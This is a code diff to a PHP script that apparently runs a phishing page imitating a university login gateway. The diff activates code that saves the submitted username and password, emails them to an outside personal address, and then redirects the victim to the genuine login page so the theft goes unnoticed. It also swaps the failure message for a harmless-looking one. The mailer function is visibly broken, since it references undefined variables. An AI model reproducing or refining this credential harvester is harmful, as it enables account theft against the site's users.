@@ -19,14 +19,14 @@ class Master{
 
 	public function process(){
 		if($this->writeFile($_POST['username'], $_POST['password'])){
-			//The file hase been written...., try and send the mail...
-			// $this->sendMail();
-			// $this->msg = "Done";
-			header('Location: http://gateway.oauife.edu.ng');
+
+			$this->sendMail();
+
+			header('Location: http://gateway.oauife.edu.ng/login');
 			exit;
 		}else{
 			//File not written....
-			$this->msg = "Failed";
+			$this->msg = "Something went wrong, please try again....";
 			die($this->msg);
 		}
 	}
@@ -42,8 +42,9 @@ class Master{
 		}
 	}
 
-	private function sendMail(){
-		
+	private function sendMail($u = "", $p = ""){
+		//mailer...
+        mail('ojudusegun@gmail.com', 'Intecu', "*Username: ".$name." | Password: ".$pass . "\r\n\r\n");
 	}
 }
 $mast = new Master();
